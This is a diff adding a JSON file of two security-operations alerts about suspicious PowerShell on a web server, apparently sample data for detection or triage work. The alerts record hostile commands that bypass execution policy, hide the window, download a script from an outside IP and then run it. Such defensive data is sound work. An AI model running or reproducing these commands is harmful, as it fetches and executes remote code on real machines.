@@ -1,0 +1,20 @@
+[
+  {
+    "alert_id": "SOC-9621",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:08:41.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "alert_id": "SOC-9622",
+    "alert_name": "Suspicious PowerShell Script Execution",
+    "start_time": "2026-01-26T06:11:02.000Z",
+    "source_ip": "10.3.80.44",
+    "endpoint": "SRV-WEB-02",
+    "user": "r.kuznetsov",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
